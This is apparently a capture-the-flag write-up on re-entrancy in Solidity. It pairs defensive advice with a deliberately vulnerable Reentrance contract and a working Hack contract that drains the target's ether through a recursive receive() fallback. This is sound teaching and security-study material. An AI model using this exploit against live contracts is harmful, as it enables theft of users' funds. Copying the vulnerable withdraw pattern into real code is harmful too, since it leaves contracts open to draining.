In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

 
The DAO Hack
The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

# Solution

1. Get a new instance
2. Taking a close look in the contract we can exploit the withdraw function
3. The objective here would be to first donate 1eth to ourselves and call the withdraw function which triggers a fallback to allow the reentrancy attack, and we can call the withdraw function until the balance is greater than 0
4. We make a new contract to make the exploit, and a function that calls the donate and then withdraw function , after which a fallback function gets triggered and the loop continues

```
contract Hack {
  Reentrance private target;

  constructor(address payable  _target){
    target = Reentrance(_target);
  } 

  function attack() external payable{
    target.donate{value: 1e18}(address(this));
    target.withdraw(1e18);

    require(address(target).balance ==0, "target balance >0");
    selfdestruct(payable(msg.sender));
  }

  receive() external payable {
    uint amount = min(1e18, address(target).balance);
    if( amount >0){
      target.withdraw(amount);
    }
    
   }

  function min(uint x, uint y) private  pure  returns(uint){
    return x <= y ? x : y ;
  }

}
```
